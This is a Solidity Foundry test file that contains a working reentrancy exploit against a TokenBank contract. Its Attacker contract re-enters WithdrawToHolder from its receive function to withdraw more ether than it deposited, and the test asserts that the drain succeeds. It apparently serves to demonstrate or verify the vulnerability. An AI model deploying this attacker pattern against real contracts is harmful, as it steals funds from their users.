
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _tokenBank;
    Attacker public _attacker;

    function setUp() public {
        _tokenBank = new TokenBank();
        _tokenBank.initTokenBank();
        _attacker = new Attacker(address(_tokenBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal >= 0.5 ether && attackVal <= 10 ether);

        uint256 attackerDeposit = attackVal * 2;
        vm.assume(attackerDeposit > _tokenBank.MinDeposit());
        vm.assume(attackerDeposit <= type(uint128).max);

        _tokenBank.initTokenBank();

        vm.deal(address(_tokenBank), attackVal * 3);
        vm.deal(address(_attacker), attackerDeposit);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackerDeposit}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackValue;
    uint256 public initialVictimBalance;
    uint256 public initialAttackerBalance;

    constructor(address victimAddress) {
        victim = TokenBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
        
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        attackValue = val;
        initialVictimBalance = address(victim).balance;
        initialAttackerBalance = address(this).balance;
        
        victim.WithdrawToHolder(address(this), attackValue);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 finalAttackerBalance = address(this).balance;
        
        if (finalAttackerBalance > initialAttackerBalance + attackValue && 
            finalVictimBalance < initialVictimBalance - attackValue) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.WithdrawToHolder(address(this), attackValue);
        }
    }
}
